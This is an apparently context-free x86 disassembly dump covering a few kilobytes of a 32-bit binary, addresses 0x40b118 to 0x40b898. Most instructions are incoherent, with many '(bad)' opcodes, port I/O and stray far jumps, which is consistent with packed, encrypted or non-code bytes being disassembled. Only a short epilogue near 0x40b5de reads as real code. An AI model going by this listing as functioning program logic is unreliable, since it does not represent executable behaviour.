  40b118:	mov    ds:0x35dbd382,eax
  40b11d:	inc    edi
  40b11e:	pop    ebp
  40b11f:	sub    eax,0x987f95de
  40b124:	in     eax,dx
  40b125:	pop    eax
  40b126:	test   al,0x94
  40b128:	jg     0x40b0e4
  40b12a:	call   0x99d8e165
  40b12f:	xor    bh,BYTE PTR [edx-0x2503a1c8]
  40b135:	mov    esp,0x1f126d9f
  40b13a:	loop   0x40b151
  40b13c:	(bad)
  40b13f:	aas    
  40b140:	push   esp
  40b141:	daa    
  40b142:	jbe    0x40b124
  40b144:	bound  edx,QWORD PTR ds:[ebp-0x38551498]
  40b14b:	pop    esp
  40b14c:	(bad)  
  40b14d:	in     eax,0xaf
  40b14f:	(bad)  
  40b150:	clc    
  40b151:	imul   esp,ecx,0x9db60262
  40b157:	inc    esi
  40b158:	loopne 0x40b1cb
  40b15a:	dec    ebx
  40b15b:	into   
  40b15c:	icebp  
  40b15d:	loop   0x40b148
  40b15f:	pop    ss
  40b160:	enter  0x4d08,0xe3
  40b164:	clc    
  40b165:	repnz xchg ebx,eax
  40b167:	aad    0xcb
  40b169:	jp     0x40b1e7
  40b16b:	mov    edi,0x2034c919
  40b170:	push   0xfffffff6
  40b172:	test   DWORD PTR ds:0x6f9d9823,ebp
  40b178:	add    dl,ah
  40b17a:	cwde   
  40b17b:	gs mov cl,0x66
  40b17e:	lea    esp,[eax-0x3a]
  40b181:	and    ebx,DWORD PTR [eax-0x5b]
  40b184:	js     0xa9af6e55
  40b18a:	pop    ss
  40b18b:	pop    ecx
  40b18c:	pop    edi
  40b18d:	in     al,dx
  40b18e:	(bad)  
  40b18f:	std    
  40b190:	inc    esi
  40b191:	ret    
  40b192:	push   ds
  40b193:	fldenv [ecx+edx*8]
  40b196:	cmp    edi,DWORD PTR [ebp-0x26]
  40b199:	xchg   ebp,eax
  40b19a:	sti    
  40b19b:	inc    ecx
  40b19c:	rcl    BYTE PTR [edx-0x14],1
  40b19f:	dec    edx
  40b1a0:	test   al,0xe3
  40b1a2:	les    eax,FWORD PTR [ebx-0x5b48a3eb]
  40b1a8:	rol    BYTE PTR [ecx+0x65],0x4c
  40b1ac:	out    0xe3,eax
  40b1ae:	or     cl,0x11
  40b1b1:	test   edi,edi
  40b1b3:	mov    eax,ds:0xeab7bf16
  40b1b8:	xchg   BYTE PTR [ecx+0x5b02141a],al
  40b1be:	cmc    
  40b1bf:	ins    DWORD PTR es:[edi],dx
  40b1c0:	mov    eax,0xc8294d5f
  40b1c5:	repz add BYTE PTR [edx-0x6903ea56],0x3b
  40b1cd:	js     0x40b154
  40b1cf:	dec    esi
  40b1d0:	dec    ebx
  40b1d1:	push   edi
  40b1d2:	mov    ah,0xd8
  40b1d4:	mov    cl,BYTE PTR [esi-0x52]
  40b1d7:	loop   0x40b1c9
  40b1d9:	int    0x64
  40b1db:	mov    DWORD PTR [ecx],0x5e5c3991
  40b1e1:	loope  0x40b20c
  40b1e3:	(bad)  
  40b1e4:	out    dx,eax
  40b1e5:	bound  edi,QWORD PTR [bx+si-0x39cd]
  40b1ea:	cmc    
  40b1eb:	adc    al,0xc4
  40b1ed:	xchg   ecx,eax
  40b1ee:	sub    ah,BYTE PTR [edx]
  40b1f0:	mov    bl,0xdf
  40b1f2:	inc    eax
  40b1f3:	mov    WORD PTR [edi+0xc],?
  40b1f6:	test   eax,0xea96a9e4
  40b1fb:	test   BYTE PTR [eax-0x56b5fcc8],dl
  40b201:	loopne 0x40b1dc
  40b203:	push   edi
  40b204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b205:	sti    
  40b206:	adc    esi,edx
  40b208:	jne    0x40b289
  40b20a:	pop    ebx
  40b20b:	and    ecx,esp
  40b20d:	inc    esp
  40b20e:	dec    ebx
  40b20f:	and    BYTE PTR [ebp+0x716f48e8],bl
  40b215:	stos   BYTE PTR es:[edi],al
  40b216:	inc    ebp
  40b217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b218:	out    dx,eax
  40b219:	(bad)  
  40b21a:	stos   BYTE PTR es:[edi],al
  40b21b:	mov    ebx,0x1a0c120e
  40b220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b221:	mov    ds:0x47ace722,eax
  40b226:	dec    esi
  40b227:	aam    0xde
  40b229:	pop    ebp
  40b22a:	idiv   BYTE PTR [ebp-0x47018b4b]
  40b230:	mov    dh,0x18
  40b232:	pop    ecx
  40b233:	inc    esi
  40b234:	or     al,0xf9
  40b236:	aad    0xea
  40b238:	aas    
  40b239:	dec    esp
  40b23a:	test   dh,cl
  40b23c:	jbe    0x40b209
  40b23e:	xchg   esp,eax
  40b23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b240:	imul   esp,DWORD PTR [eax-0x64],0x5baaaaf2
  40b247:	retf   0x6daa
  40b24a:	mov    eax,DWORD PTR [edi-0x66]
  40b24d:	sbb    al,0xa5
  40b24f:	dec    eax
  40b250:	or     DWORD PTR [edx],0xffffff9b
  40b253:	fdivr  DWORD PTR [ebx]
  40b255:	jns    0x40b2b3
  40b257:	daa    
  40b258:	mov    bh,0xe2
  40b25a:	sbb    ecx,DWORD PTR [ecx]
  40b25c:	add    dl,BYTE PTR [edx-0x684b26d]
  40b262:	lods   eax,DWORD PTR ds:[esi]
  40b263:	jg     0x40b248
  40b265:	out    dx,eax
  40b266:	mov    ebx,0xb2203754
  40b26b:	adc    DWORD PTR [ecx],edi
  40b26d:	pop    ds
  40b26e:	and    al,0x50
  40b270:	mov    al,ds:0x8c4c6915
  40b275:	rcl    BYTE PTR [ecx-0x388be139],0x2
  40b27c:	adc    eax,0x32b4657
  40b281:	mov    ss,WORD PTR es:[edi+0x546d74c5]
  40b288:	iret   
  40b289:	or     esp,eax
  40b28b:	scas   al,BYTE PTR es:[edi]
  40b28c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28d:	jo     0x40b296
  40b28f:	xchg   esi,eax
  40b290:	pop    ebp
  40b291:	push   edi
  40b292:	jmp    0x9cc1:0xc98a24e7
  40b299:	xor    ecx,DWORD PTR [edi]
  40b29b:	mov    esi,ss
  40b29d:	leave  
  40b29e:	mov    esi,0x2e0b996
  40b2a3:	(bad)  
  40b2a4:	dec    ebp
  40b2a5:	sub    ebx,eax
  40b2a7:	rcr    BYTE PTR [edi+0xf10da01],0xd0
  40b2ae:	mov    edx,0xf4ca669
  40b2b3:	xchg   BYTE PTR [eax],cl
  40b2b5:	push   0x0
  40b2b7:	inc    esp
  40b2b8:	adc    al,0x8f
  40b2ba:	cmp    eax,0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xd346b132
  40b2d2:	pop    edi
  40b2d3:	in     al,0xce
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2dd:	pop    ds
  40b2de:	out    0x44,al
  40b2e0:	dec    esi
  40b2e1:	adc    DWORD PTR [edi-0x51744487],ebx
  40b2e7:	lods   eax,DWORD PTR ds:[esi]
  40b2e8:	iret   
  40b2e9:	gs call 0xd523d606
  40b2ef:	mov    bl,0x25
  40b2f1:	inc    DWORD PTR [esi-0x4cab9423]
  40b2f7:	or     al,0x5e
  40b2f9:	mov    cs,WORD PTR [edx-0x1ce9de1c]
  40b2ff:	push   edi
  40b300:	cmp    al,0xf7
  40b302:	and    dl,BYTE PTR [ebp+0x225c9aaf]
  40b308:	repz call 0x17ab:0x431a1f03
  40b310:	fwait
  40b311:	xchg   esp,eax
  40b312:	push   ecx
  40b313:	out    0xfd,eax
  40b315:	push   edx
  40b316:	xchg   ebx,esp
  40b318:	lods   eax,DWORD PTR ds:[esi]
  40b319:	jnp    0x40b2d9
  40b31b:	pop    es
  40b31c:	cmp    edx,DWORD PTR [edi-0x6]
  40b31f:	aas    
  40b320:	leave  
  40b321:	fdiv   QWORD PTR [eax]
  40b323:	mov    ebp,0xe5a2769c
  40b328:	or     DWORD PTR [ecx+0x526d94ba],edx
  40b32e:	fcom   DWORD PTR [ebx-0x7d1f856e]
  40b334:	or     BYTE PTR [ebx+0x4c3d3a27],ah
  40b33a:	xchg   bh,ch
  40b33c:	aam    0x65
  40b33e:	add    eax,0x44ef42a
  40b343:	adc    al,0xb0
  40b345:	(bad)  
  40b346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b347:	mov    ah,BYTE PTR [edx-0x2d]
  40b34a:	or     DWORD PTR [ebp-0x7a],eax
  40b34d:	mov    al,0xcb
  40b34f:	ror    DWORD PTR [ebx-0x6ae7ce11],cl
  40b355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b356:	leave  
  40b357:	js     0x40b369
  40b359:	lea    ebx,[ecx-0x271f5363]
  40b35f:	adc    eax,0x4489f607
  40b364:	imul   edx,DWORD PTR ds:0x944fbafa,0x18f4c4f2
  40b36e:	shl    BYTE PTR [ecx+eax*8],1
  40b371:	cmp    edx,0x6460d600
  40b377:	enter  0xacee,0x52
  40b37b:	dec    esi
  40b37c:	adc    al,0x11
  40b37e:	out    0xed,eax
  40b380:	cmp    cl,0xb7
  40b383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b384:	push   edx
  40b385:	xor    eax,0xb34423cf
  40b38a:	and    BYTE PTR [ebx],0x30
  40b38d:	or     DWORD PTR [ecx],esi
  40b38f:	cmp    dh,BYTE PTR [edx]
  40b391:	cmc    
  40b392:	add    al,0x21
  40b394:	sub    al,0x71
  40b396:	scas   al,BYTE PTR es:[edi]
  40b397:	or     eax,edi
  40b399:	ins    DWORD PTR es:[edi],dx
  40b39a:	shl    ebx,0xc8
  40b39d:	mov    cl,0x7a
  40b39f:	ret    0x1030
  40b3a2:	popa   
  40b3a3:	pusha  
  40b3a4:	leave  
  40b3a5:	inc    ebp
  40b3a6:	inc    ebx
  40b3a7:	(bad)  
  40b3a8:	dec    edx
  40b3a9:	cmp    al,0x19
  40b3ab:	aam    0xea
  40b3ad:	jecxz  0x40b3d3
  40b3af:	repnz clc 
  40b3b1:	out    dx,eax
  40b3b2:	leave  
  40b3b3:	fwait
  40b3b4:	adc    DWORD PTR [edi+0x6d86a7b2],ebx
  40b3ba:	fmulp  st(6),st
  40b3bc:	xchg   esp,eax
  40b3bd:	addr16 pop edx
  40b3bf:	repnz sub al,0x7e
  40b3c2:	repnz ins DWORD PTR es:[edi],dx
  40b3c4:	or     di,WORD PTR [esi]
  40b3c7:	pusha  
  40b3c8:	mov    ebx,ebx
  40b3ca:	repz mov eax,0xd78bcc5b
  40b3d0:	popa   
  40b3d1:	xchg   ecx,eax
  40b3d2:	std    
  40b3d3:	and    al,0xf9
  40b3d5:	jecxz  0x40b399
  40b3d7:	jge    0x40b37a
  40b3d9:	icebp  
  40b3da:	jne    0x40b384
  40b3dc:	jo     0x40b451
  40b3de:	xor    eax,0x90bc4d99
  40b3e3:	out    0xee,al
  40b3e5:	xchg   BYTE PTR [esi],dl
  40b3e7:	stos   DWORD PTR es:[edi],eax
  40b3e8:	call   0xb138:0x95638f29
  40b3ef:	jge    0x40b3d3
  40b3f1:	push   esi
  40b3f2:	pop    ss
  40b3f3:	lahf   
  40b3f4:	cdq    
  40b3f5:	xchg   ebp,eax
  40b3f6:	xor    DWORD PTR [edx],esp
  40b3f8:	mov    esi,DWORD PTR cs:[ecx-0x2e]
  40b3fc:	int    0x54
  40b3fe:	rol    BYTE PTR [edx+0x293adc39],1
  40b404:	test   ah,bh
  40b406:	fldenv ds:0x6b572d15
  40b40c:	outs   dx,DWORD PTR ds:[esi]
  40b40d:	imul   edi,DWORD PTR [ebp+0x39],0xbd22b9c
  40b414:	cmp    edi,DWORD PTR [ecx+ecx*8+0x52]
  40b418:	pop    eax
  40b419:	aad    0xc3
  40b41b:	ins    BYTE PTR es:[edi],dx
  40b41c:	out    dx,eax
  40b41d:	mov    ds:0xd80da16f,al
  40b422:	jl     0x40b42d
  40b424:	imul   ebx,DWORD PTR [edi+0x73e5614b],0xc41192f9
  40b42e:	mov    ebp,0xdacc11db
  40b433:	mov    ch,0xa6
  40b435:	mov    WORD PTR [edx+0x8],ds
  40b438:	lods   al,BYTE PTR ds:[esi]
  40b439:	and    DWORD PTR [esp+esi*1],ebp
  40b43c:	ds aaa 
  40b43e:	scas   eax,DWORD PTR es:[edi]
  40b43f:	or     DWORD PTR [eax+0x13be6f1f],ebx
  40b445:	loope  0x40b4b3
  40b447:	xchg   ebx,eax
  40b448:	push   eax
  40b449:	js     0x40b43c
  40b44b:	sub    bl,0xd0
  40b44e:	enter  0x902,0x85
  40b452:	sub    BYTE PTR [ebp-0x45e6bde5],dh
  40b458:	ret    
  40b459:	repnz inc esi
  40b45b:	jle    0x40b438
  40b45d:	inc    esp
  40b45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45f:	jge    0x40b42f
  40b461:	pop    esp
  40b462:	push   esi
  40b463:	cld    
  40b464:	sbb    ebp,0xffffffa8
  40b467:	mov    al,ds:0x5d28101a
  40b46c:	cmc    
  40b46d:	test   DWORD PTR [edi+esi*1-0xc],ebp
  40b471:	addr16 push ds
  40b473:	pop    edi
  40b474:	call   DWORD PTR [esp]
  40b477:	in     eax,dx
  40b478:	adc    bl,cl
  40b47a:	add    BYTE PTR [ecx],0xfb
  40b47d:	cdq    
  40b47e:	add    cl,al
  40b480:	ja     0x40b412
  40b482:	(bad)  
  40b483:	scas   al,BYTE PTR es:[edi]
  40b484:	imul   esi,DWORD PTR [esp+ebp*4-0x35],0xffffffab
  40b489:	lock sub DWORD PTR [ebp+0x78ba93a1],esi
  40b490:	loop   0x40b451
  40b492:	out    dx,al
  40b493:	mov    al,ds:0x409f88d9
  40b498:	enter  0xb2c4,0x2f
  40b49c:	sub    DWORD PTR ds:0x897be71f,edx
  40b4a2:	dec    ebx
  40b4a3:	mov    ecx,0xce0c9833
  40b4a8:	dec    ecx
  40b4a9:	cdq    
  40b4aa:	fild   DWORD PTR [esi]
  40b4ac:	iret   
  40b4ad:	rcl    BYTE PTR [edx],cl
  40b4af:	push   0x291606d8
  40b4b4:	sbb    DWORD PTR [ecx],0x2d6ac26c
  40b4ba:	inc    ecx
  40b4bb:	retf   
  40b4bc:	ss push cs
  40b4be:	and    bh,BYTE PTR [ebx]
  40b4c0:	cmp    BYTE PTR ds:0x9802c6af,bh
  40b4c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4c7:	test   eax,0x2cf0f9ea
  40b4cc:	jmp    0xc4c:0xece27348
  40b4d3:	out    0x49,eax
  40b4d5:	sub    bl,dl
  40b4d7:	dec    esi
  40b4d8:	fldcw  WORD PTR [eax+edi*4+0x48ffaf78]
  40b4df:	or     DWORD PTR [esi],esi
  40b4e1:	mov    bh,0xb
  40b4e3:	mov    ecx,0x83887bbb
  40b4e8:	cmp    eax,0x416089e3
  40b4ed:	repz clc 
  40b4ef:	xor    BYTE PTR [eax],bl
  40b4f1:	inc    edx
  40b4f2:	xor    BYTE PTR [edi+0x27],bl
  40b4f5:	aaa    
  40b4f6:	add    DWORD PTR [eax+0x380a4381],ebx
  40b4fc:	retf   0x42ae
  40b4ff:	push   esp
  40b500:	je     0x40b485
  40b502:	mov    eax,0x496217ad
  40b507:	xchg   DWORD PTR [ecx],ebp
  40b509:	add    al,0xcc
  40b50b:	adc    ecx,DWORD PTR [ebp+0x51]
  40b50e:	cmp    eax,0x7e8e8175
  40b513:	pop    edx
  40b514:	fsub   st(2),st
  40b516:	add    esi,DWORD PTR [ebp-0x6c05e9e8]
  40b51c:	jge    0x40b4ce
  40b51e:	mov    fs,WORD PTR [ebx]
  40b520:	mov    ecx,ds
  40b522:	rcr    BYTE PTR [eax-0x54],0x67
  40b526:	sbb    ebp,DWORD PTR [esi+0x3f]
  40b529:	in     eax,0x99
  40b52b:	push   0x695118a
  40b530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b531:	test   al,0xc3
  40b533:	jo     0x40b56f
  40b535:	nop
  40b536:	mov    bh,0x49
  40b538:	jle    0x40b53a
  40b53a:	sub    al,0x82
  40b53c:	into   
  40b53d:	cmp    DWORD PTR [esi+0x6f],esi
  40b540:	test   BYTE PTR [edx+0x34a6b99a],0x11
  40b547:	adc    ah,BYTE PTR [eax]
  40b549:	xlat   BYTE PTR ds:[ebx]
  40b54a:	and    ebx,DWORD PTR [edi+ebx*8]
  40b54d:	jmp    edx
  40b54f:	pop    ss
  40b550:	adc    eax,0xdfe26b72
  40b555:	ds daa 
  40b557:	mov    dh,0xa9
  40b559:	adc    esi,DWORD PTR [esi+0x3d]
  40b55c:	nop
  40b55d:	sbb    DWORD PTR [edx],esp
  40b55f:	and    BYTE PTR [eax+0x75],0xbf
  40b563:	mov    ebx,0xfe1a4295
  40b568:	cdq    
  40b569:	test   al,0xe7
  40b56b:	inc    ecx
  40b56c:	xchg   edx,eax
  40b56d:	inc    esi
  40b56e:	(bad)  
  40b56f:	cmc    
  40b570:	pop    esp
  40b571:	clc    
  40b572:	adc    ah,dl
  40b574:	clc    
  40b575:	dec    esp
  40b576:	iret   
  40b577:	cmp    eax,0x6ac9a9e9
  40b57c:	mov    dh,0x8a
  40b57e:	jmp    0x9006e9cd
  40b583:	adc    cl,dl
  40b585:	add    bh,dh
  40b587:	sub    eax,0x6f1dd99e
  40b58c:	(bad)  
  40b58d:	xchg   esp,eax
  40b58e:	push   ebx
  40b58f:	pushf  
  40b590:	sub    ebx,DWORD PTR [ebx-0x4261b5dd]
  40b596:	aam    0xa3
  40b598:	sbb    eax,0x45b5c247
  40b59d:	shr    DWORD PTR [edx-0x5b],0x48
  40b5a1:	ja     0x40b5e1
  40b5a3:	xchg   esi,eax
  40b5a4:	int    0x42
  40b5a6:	xchg   ebx,eax
  40b5a7:	push   ebp
  40b5a8:	push   ebp
  40b5a9:	xchg   esp,eax
  40b5aa:	or     eax,0x49e9b9f4
  40b5af:	imul   eax,DWORD PTR [edi+ecx*8-0x19cee4aa],0xffffff89
  40b5b7:	sbb    DWORD PTR [ebp+ebp*4+0x37],esi
  40b5bb:	sahf   
  40b5bc:	in     al,dx
  40b5bd:	pop    esp
  40b5bf:	fistp  DWORD PTR [edx-0x79]
  40b5c2:	div    bh
  40b5c4:	jl     0x40b596
  40b5c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5c7:	test   BYTE PTR [edx+0x7a047bfc],bl
  40b5cd:	or     BYTE PTR [eax-0x1dccd348],al
  40b5d3:	push   esi
  40b5d4:	sub    al,0xeb
  40b5d6:	jae    0x40b56f
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0x40ccd584]
  40b60d:	(bad)  
  40b60f:	loopne 0x40b5db
  40b611:	(bad)  
  40b612:	js     0x40b68c
  40b614:	je     0x40b694
  40b616:	js     0x40b690
  40b618:	ret    0x825d
  40b61b:	in     eax,0x15
  40b61d:	mov    ebx,esi
  40b61f:	mov    dh,0x6
  40b621:	in     al,dx
  40b622:	pop    edi
  40b623:	(bad)  
  40b624:	jnp    0x40b673
  40b626:	dec    eax
  40b627:	std    
  40b628:	xchg   esi,eax
  40b629:	mov    ds:0x469f3785,eax
  40b62e:	and    al,0xf7
  40b630:	pop    es
  40b631:	imul   esp,edx,0x2ef189e4
  40b637:	mov    bl,0x11
  40b639:	cmc    
  40b63a:	lods   al,BYTE PTR ds:[esi]
  40b63b:	out    0x33,eax
  40b63d:	ss stos BYTE PTR es:[edi],al
  40b63f:	push   es
  40b640:	pop    es
  40b641:	cmp    al,cl
  40b643:	arpl   WORD PTR [ebx-0x5766e20e],dx
  40b649:	sbb    DWORD PTR [eax-0x2e],edi
  40b64c:	loop   0x40b61d
  40b64e:	jge    0x40b63a
  40b650:	pop    esi
  40b651:	push   ecx
  40b652:	jle    0x40b61c
  40b654:	jge    0x40b5da
  40b656:	lea    esi,[ecx]
  40b658:	pop    eax
  40b659:	in     al,0xf2
  40b65b:	cmp    BYTE PTR [eax],0xe8
  40b65e:	gs call 0xbfc523f
  40b664:	loope  0x40b610
  40b666:	jo     0x40b61f
  40b668:	xchg   BYTE PTR [esi],bl
  40b66a:	mov    ecx,0x7b11edb8
  40b66f:	mov    BYTE PTR cs:[esi+esi*4+0x71927321],al
  40b677:	mov    eax,gs:0x53e2101c
  40b67d:	pop    esi
  40b67e:	sbb    ah,BYTE PTR [ecx-0x494061bd]
  40b684:	dec    ebp
  40b685:	test   DWORD PTR [esi],0x1dc10b96
  40b68b:	push   edx
  40b68c:	(bad)  
  40b68e:	aam    0xbe
  40b690:	adc    esp,DWORD PTR [esi+0x7e3f711a]
  40b696:	lds    eax,FWORD PTR [ebp-0x3db75514]
  40b69c:	repz scas al,BYTE PTR es:[edi]
  40b69e:	into   
  40b69f:	jge    0x40b64f
  40b6a1:	out    0xb2,eax
  40b6a3:	gs out dx,eax
  40b6a5:	inc    ebx
  40b6a6:	xor    dh,bl
  40b6a8:	ins    DWORD PTR es:[edi],dx
  40b6a9:	xor    bl,BYTE PTR [ecx+0x48]
  40b6ac:	push   ss
  40b6ad:	nop
  40b6ae:	sub    eax,0x7b045ce5
  40b6b3:	out    0xab,al
  40b6b5:	jne    0x40b706
  40b6b7:	jecxz  0x40b651
  40b6b9:	loope  0x40b6f0
  40b6bb:	mov    esp,0x55fade0c
  40b6c0:	daa    
  40b6c1:	ins    BYTE PTR es:[edi],dx
  40b6c2:	lds    esp,FWORD PTR [edi+ebx*8-0x76]
  40b6c6:	jbe    0x40b64e
  40b6c8:	nop
  40b6c9:	or     edi,esp
  40b6cb:	sub    esp,esi
  40b6cd:	lods   eax,DWORD PTR ds:[esi]
  40b6ce:	xor    DWORD PTR [edi-0x1124b384],ecx
  40b6d4:	sbb    bh,BYTE PTR [edx]
  40b6d6:	push   ebx
  40b6d7:	js     0x40b704
  40b6d9:	fistp  QWORD PTR [eax-0x30]
  40b6dc:	fmulp  st(5),st
  40b6de:	sti    
  40b6df:	inc    ecx
  40b6e0:	push   ebx
  40b6e1:	mov    DWORD PTR [ecx-0xa],ebp
  40b6e4:	push   ebx
  40b6e5:	aaa    
  40b6e6:	adc    dl,BYTE PTR [esi]
  40b6e8:	sbb    esp,DWORD PTR [eax-0x80]
  40b6eb:	fnstcw WORD PTR [edx-0x38b5494c]
  40b6f1:	(bad)  
  40b6f2:	sbb    BYTE PTR [ecx-0x28f07929],bh
  40b6f8:	sbb    al,0xbc
  40b6fa:	je     0x40b6f1
  40b6fc:	sbb    eax,0xf451d74a
  40b701:	bound  esi,QWORD PTR [ebx-0x3e]
  40b704:	sbb    DWORD PTR [esi+0x28cf9e76],edx
  40b70a:	push   ecx
  40b70b:	repz pop ebx
  40b70d:	cmp    ch,bl
  40b70f:	dec    ecx
  40b710:	xor    BYTE PTR [ebp-0x68a604ab],dl
  40b716:	push   eax
  40b717:	addr16 (bad) 
  40b719:	cmp    ah,BYTE PTR [edx+0x7783d3c4]
  40b71f:	pop    esp
  40b720:	adc    dh,BYTE PTR [ecx+ebp*8-0x70cc94b3]
  40b727:	cmp    cl,al
  40b729:	test   al,0xad
  40b72b:	outs   dx,DWORD PTR ds:[esi]
  40b72c:	gs xchg esp,eax
  40b72e:	not    BYTE PTR [edx]
  40b730:	inc    esp
  40b731:	dec    cl
  40b733:	push   ss
  40b734:	inc    esi
  40b735:	(bad)  
  40b736:	in     al,0xc3
  40b738:	adc    eax,0xf5a5a452
  40b73d:	(bad)  
  40b73e:	mov    eax,ds:0xb744d6f8
  40b743:	test   esp,eax
  40b745:	test   al,0x64
  40b747:	pop    esp
  40b748:	mov    ah,0xe6
  40b74a:	cld    
  40b74b:	fidiv  DWORD PTR [esi+0x57]
  40b74e:	add    ebp,esp
  40b750:	push   ecx
  40b751:	pop    eax
  40b752:	cmp    ch,BYTE PTR [edi]
  40b754:	sub    eax,0xc599e3cd
  40b759:	cmovo  edx,DWORD PTR [ebx]
  40b75c:	imul   ebp,DWORD PTR [ecx],0x29
  40b75f:	je     0x40b767
  40b761:	out    dx,al
  40b762:	sbb    cl,BYTE PTR [edi]
  40b764:	or     esi,ebx
  40b766:	loop   0x40b729
  40b768:	sub    al,0xb
  40b76a:	ja     0x40b769
  40b76c:	cs push cs
  40b76e:	(bad)  
  40b76f:	repz pop ds
  40b771:	shl    eax,1
  40b773:	push   ebp
  40b774:	dec    esi
  40b775:	enter  0xa6c7,0x97
  40b779:	mov    edi,0x595163a
  40b77e:	test   al,0x70
  40b780:	mov    ebx,0x7527236
  40b785:	(bad)  
  40b786:	lods   eax,DWORD PTR ds:[esi]
  40b787:	cdq    
  40b788:	cmp    ebx,ecx
  40b78a:	leave  
  40b78b:	and    eax,eax
  40b78d:	sub    bl,cl
  40b78f:	repz inc edi
  40b791:	inc    esi
  40b792:	ret    0xbccd
  40b795:	data16 sub ah,BYTE PTR [ecx+0x62]
  40b799:	sbb    cl,ch
  40b79b:	(bad)  
  40b79c:	mov    edx,0x4df82939
  40b7a1:	add    DWORD PTR [eax-0x2256116],ebp
  40b7a7:	leave  
  40b7a8:	push   ebp
  40b7a9:	jmp    0xd996:0x5ece9000
  40b7b0:	add    BYTE PTR [eax],ah
  40b7b2:	pop    ecx
  40b7b3:	inc    ecx
  40b7b4:	test   DWORD PTR [edi],ebp
  40b7b6:	lock fld st(6)
  40b7b9:	(bad)  
  40b7ba:	or     eax,DWORD PTR [ebx+0x78dac6ce]
  40b7c0:	push   ss
  40b7c1:	inc    edx
  40b7c2:	scas   eax,DWORD PTR es:[edi]
  40b7c3:	test   eax,0x51cdaf02
  40b7c8:	cld    
  40b7c9:	outs   dx,DWORD PTR ds:[esi]
  40b7ca:	aam    0xd8
  40b7cc:	xor    al,0xe4
  40b7ce:	mov    ds:0x91910a18,eax
  40b7d3:	not    eax
  40b7d5:	loopne 0x40b7cf
  40b7d7:	pop    ebp
  40b7d8:	out    0xc1,al
  40b7da:	push   ds
  40b7db:	ret    0xaa66
  40b7de:	mov    esi,DWORD PTR [edx-0xd8fd0c4]
  40b7e4:	mov    ecx,es
  40b7e6:	sub    al,BYTE PTR [eax+edx*4]
  40b7e9:	push   ecx
  40b7ea:	ja     0x40b7eb
  40b7ec:	cwde   
  40b7ed:	test   al,dl
  40b7ef:	dec    eax
  40b7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f1:	or     BYTE PTR [esi-0x7e3d290f],ch
  40b7f7:	out    0x43,eax
  40b7f9:	test   DWORD PTR [ecx+0x2e],0x21b4df77
  40b800:	or     bl,BYTE PTR [ebp+0x8]
  40b803:	imul   esi,DWORD PTR [esi+ecx*1+0x545c21e0],0x2ea70478
  40b80e:	add    eax,0xf26660d8
  40b813:	dec    ecx
  40b814:	pushf  
  40b815:	fld    DWORD PTR [edx-0x1c]
  40b818:	and    BYTE PTR [ebx-0x5f],0x3e
  40b81c:	ret    0xc9bf
  40b81f:	xchg   esi,eax
  40b820:	push   eax
  40b821:	jnp    0x40b7f1
  40b823:	mov    ecx,0x806f6309
  40b828:	in     al,dx
  40b829:	lods   al,BYTE PTR ds:[esi]
  40b82a:	loop   0x40b844
  40b82c:	repz js 0x40b7db
  40b82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b831:	in     eax,dx
  40b832:	mov    bl,0xf1
  40b834:	pop    eax
  40b835:	jl     0x40b7ff
  40b837:	pop    ss
  40b838:	push   eax
  40b839:	add    edi,0x7c3107f3
  40b83f:	sub    esp,DWORD PTR [eax+0x36bc1fb2]
  40b845:	mov    eax,ds:0x6fd9e571
  40b84a:	adc    DWORD PTR [edx*4+0x26d0e37b],edx
  40b851:	test   ah,dl
  40b853:	repnz aaa 
  40b855:	cwde   
  40b856:	pop    eax
  40b857:	jb     0x40b83d
  40b859:	cmp    eax,0xe2c88778
  40b85e:	adc    al,0x61
  40b860:	push   esi
  40b861:	lock dec eax
  40b863:	jae    0x40b7ec
  40b865:	cmp    al,0x57
  40b867:	jg     0x40b8c2
  40b869:	jmp    0xfe1a:0x764e8e2
  40b870:	sbb    ecx,DWORD PTR [ecx+0x7b1770fb]
  40b876:	sub    esi,DWORD PTR [edx-0x6]
  40b879:	xor    dl,ah
  40b87b:	pop    ds
  40b87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87d:	std    
  40b87e:	cmp    esp,DWORD PTR ds:0xa6333591
  40b884:	pop    ecx
  40b885:	and    BYTE PTR [eax-0x75],0x3e
  40b889:	mov    edi,0xcbb90ad5
  40b88e:	nop
  40b88f:	jmp    0xb95d:0x2ba7a785
  40b896:	mov    dh,0x5b
  40b898:	xor    BYTE PTR [eax-0x43],0xbe
